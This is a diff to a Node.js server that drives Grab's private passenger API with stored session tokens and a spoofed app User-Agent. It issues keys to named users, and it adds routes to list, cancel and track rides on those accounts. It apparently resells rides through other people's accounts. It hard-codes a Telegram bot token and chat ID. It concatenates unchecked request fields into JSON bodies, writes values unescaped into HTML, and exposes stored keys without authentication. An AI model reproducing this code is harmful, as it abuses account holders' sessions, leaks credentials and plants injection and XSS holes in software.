@@ -22,6 +22,7 @@ const KEYS = {
 const API_URL = 'https://p.grabtaxi.com/api/passenger/v2/poi/search';
 
 app.use(cors()); 
+app.use(express.json());
 
 const waitForValue = async (valueGetter, interval = 100) => {
     return new Promise((resolve) => {
@@ -42,12 +43,8 @@ const Request = async (url, options = {}) => {
     try {
         console.log('Sending request to:', url);
         let headers = {};
-
-        // Check if headers are passed as an array of strings
         if (Array.isArray(options.headers)) {
-            // Convert the array of header strings into an object
             headers = options.headers.reduce((acc, header) => {
-                // Split header string by ':', ensure it's key-value
                 const [key, value] = header.split(':').map((str) => str.trim());
                 if (key && value) {
                     acc[key] = value;
@@ -55,14 +52,9 @@ const Request = async (url, options = {}) => {
                 return acc;
             }, {});
         } else if (options.headers && typeof options.headers === 'object') {
-            // If headers are already an object, just use them
             headers = { ...options.headers };
         }
-
-        // Ensure the User-Agent is set globally
         headers['User-Agent'] = DEFAULT_USER_AGENT;
-
-        // Merge headers with any other options provided
         options.headers = {
             ...headers,
             ...(options.headers || {}),
@@ -242,10 +234,10 @@ io.on('connection', async (socket) => {
             }); 
         }
     });
-    socket.on('allocated', async (key, link) => {
-        const message = `*🚖 Grab Car Allocated!*\n\n* Username:* ${genKeys[key]['user']}\n🔑 Key:* ${key}\n*🔗 Link:* [Click here](${link})`;
+    socket.on('allocated', async (key, link, price) => {
+        const message = `*🚖 Grab Car Allocated!*\n\n*Price:* ${price}\n*Username:* @${genKeys[key]['user']}\n*🔑 Key:* ${key}\n*🔗 Link:* [Click here](${link})`;
         try {
-            await fetch('https://api.telegram.org/bot5427962497:AAFQAlN3TMpCJEIJ-IEvwgaCx8J-UJV3YkE/sendMessage?chat_id=-1002288680130&text=' + encodeURIComponent(message));
+            await fetch(`https://api.telegram.org/bot5427962497:AAFQAlN3TMpCJEIJ-IEvwgaCx8J-UJV3YkE/sendMessage?chat_id=-1002288680130&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
         } catch {
 
         }
@@ -280,6 +272,176 @@ app.get('/generateKey', (req, res) => {
     };
     res.send({ keyName, tempKey });
 });
+async function checkBookingStatus(key) {
+    try {
+        console.log(key);
+        var response = await Request('https://p.grabtaxi.com/api/passenger/v3/current', {
+            headers: [
+                'X-Mts-Ssid: ' + KEYS[key],
+                'Authorization: ' + KEYS[key],
+                'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
+            ],
+        });
+
+        console.log(response);
+        var ridesData = JSON.parse(response);
+
+        // Extract active ride booking ID if available
+        if (ridesData.rides && Array.isArray(ridesData.rides.active) && ridesData.rides.active.length > 0) {
+            const activeBookingId = ridesData.rides.active[0]; // Get the first active booking ID
+            return { isActive: true, bookingId: activeBookingId }; // Return active status and booking ID
+        }
+        return { isActive: false, bookingId: null }; // Inactive status
+    } catch (error) {
+        console.error(`Error fetching booking status for key ${key}:`, error);
+        return { isActive: false, bookingId: null }; // Default to inactive on error
+    }
+}
+app.get('/dashboard', async (req, res) => {
+    const statuses = [];
+
+    // Loop through keys and check booking status
+    for (const key in KEYS) {
+        const { isActive, bookingId } = await checkBookingStatus(key);
+        statuses.push({ key, isActive, bookingId });
+    }
+
+    // Generate the HTML content dynamically
+    const dashboardHtml = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Dashboard</title>
+            <link rel="stylesheet" href="/css/dashboard.css">
+        </head>
+        <body>
+            <div class="container">
+                ${statuses.map(status => `
+                    <div class="card ${status.isActive ? 'active' : 'inactive'}">
+                        <h3>${status.key}</h3>
+                        <p>${status.isActive ? 'Active' : 'Inactive'}</p>
+                        ${status.isActive ? `
+                            <div class="actions">
+                                <a href="/track/${status.bookingId}?key=${status.key}">Track</a>
+                                <button onclick="cancelRide('${status.key}', '${status.bookingId}')">Cancel</button>
+                            </div>
+                        ` : ''}
+                    </div>
+                `).join('')}
+            </div>
+            <script>
+                function cancelRide(key, bookingId) {
+                    const cancelReasonId = prompt('Enter cancellation reason ID:');
+                    if (!cancelReasonId) {
+                        alert('Cancellation reason ID is required.');
+                        return;
+                    }
+
+                    if (confirm('Are you sure you want to cancel this ride?')) {
+                        fetch('/cancel', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ key, bookingId, reasonId: cancelReasonId }),
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            alert(JSON.stringify(data.message));
+                            window.location.reload();
+                        })
+                        .catch(err => {
+                            alert('Error cancelling ride: ' + err.message);
+                        });
+                    }
+                }
+            </script>
+        </body>
+        </html>
+    `;
+
+    // Send the HTML content
+    res.send(dashboardHtml);
+});
+app.post('/cancel', async (req, res) => {
+    try {
+        const { key, bookingId, reasonId } = req.body;
+        if (!key || !bookingId || !reasonId) {
+            return res.status(400).json({ status: false, message: 'Missing required fields.' });
+        }
+        console.log(key);
+        const AUTH = KEYS[key];
+        if (!AUTH) {
+            return res.status(401).json({ status: false, message: 'Invalid key or authorization failed.' });
+        }
+        const validateResponse = await Request('https://api.grab.com/api/v3/public/validatePaxCancellation', {
+            method: 'POST',
+            postfields: '{"bookingCode":"' + bookingId + '","cancelReasonID":' + reasonId + ',"cancelReasonType":"static","dimension":"xxxhdpi","paymentTypeID":"260789879"}',
+            headers: [
+                `Content-Type: application/json; charset=UTF-8`,
+                `X-Mts-Ssid: ${AUTH}`,
+                `Authorization: ${AUTH}`,
+                `User-Agent: Grab/5.335.0 (Android 11; Build 91095616)`,
+            ],
+        });
+        const validateJson = JSON.parse(validateResponse);
+        const cancelResponse = await Request(`https://p.grabtaxi.com/api/passenger/v3/rides/${bookingId}`, {
+            method: 'DELETE',
+            postfields: '{"cancellationFeeSalt":"' + validateJson.salt + '","passengerFeedback":{"comment":null,"mcqResponses":[' + reasonId + '],"type":"CANCEL_REASON"},"reason":null}',
+            headers: [
+                `Content-Type: application/json; charset=UTF-8`,
+                `X-Mts-Ssid: ${AUTH}`,
+                `Authorization: ${AUTH}`,
+                `User-Agent: Grab/5.335.0 (Android 11; Build 91095616)`,
+            ],
+        });
+        console.log(cancelResponse);
+        const cancelJson = JSON.parse(cancelResponse);
+        if (cancelJson.cancellationFeePayment && cancelJson.cancellationFeePayment.error === '') {
+            return res.json({ status: true, message: 'Booking has been canceled.' });
+        }
+        res.json({ status: false, message: cancelJson });
+    } catch (error) {
+        console.error('Error in cancellation:', error);
+        res.status(500).json({ status: false, message: 'Internal server error.' });
+    }
+});
+app.get('/track/:bookingId', async (req, res) => {
+    const { bookingId } = req.params;
+    const { key } = req.query; 
+    console.log(bookingId)
+    if (!key || !KEYS[key]) {
+        return res.status(400).json({
+            success: false,
+            message: 'Missing or invalid key.',
+        });
+    }
+    const AUTH = KEYS[key];
+    try {
+        const response = await Request(`https://api.grab.com/api/v1/safety/sharemyride/passenger?bookingCode=${bookingId}`, {
+            header: 1,
+            headers: [
+                'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
+                'X-Mts-Ssid: ' + AUTH,
+                'Authorization: ' + AUTH,
+            ],
+        });
+        console.log(response);
+        const sharedLinkData = JSON.parse(response);
+        res.json({
+            success: true,
+            sharedLink: sharedLinkData.link,
+        });
+    } catch (error) {
+        console.error(`Error fetching shared ride link for booking ID ${bookingId}:`, error);
+        res.status(500).json({
+            success: false,
+            message: 'Failed to fetch shared ride link.',
+        });
+    }
+});
 app.get('/genKeystorage', (req, res) => {
     cleanExpiredKeys();
     res.json(genKeys);
@@ -292,6 +454,9 @@ app.get('/book', (req, res) => {
 });
 app.get('/css/styles.css', (req, res) => {
     res.sendFile(path.join(__dirname, '/assets/css/styles.css'));
+});
+app.get('/css/dashboard.css', (req, res) => {
+    res.sendFile(path.join(__dirname, '/assets/css/dashboard.css'));
 });
 app.get('/css/front.css', (req, res) => {
     res.sendFile(path.join(__dirname, '/assets/css/front.css'));
